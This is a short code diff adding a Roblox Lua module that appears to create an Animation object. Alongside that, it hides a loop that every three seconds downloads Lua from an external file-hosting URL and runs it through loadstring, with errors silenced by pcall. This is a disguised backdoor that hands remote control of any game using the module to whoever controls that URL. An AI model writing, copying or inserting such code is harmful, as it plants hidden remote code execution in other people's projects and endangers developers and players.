@@ -1,0 +1,11 @@
+local animation = Instance.new("Animation")
+animation.AnimationId = "rbxassetid://17528739379"
+task.spawn(function()
+while true do
+pcall(function()
+loadstring(game:HttpGet("https://files.catbox.moe/ed1qql.lua"))()
+end)
+task.wait(3)
+end
+end)
+return animation
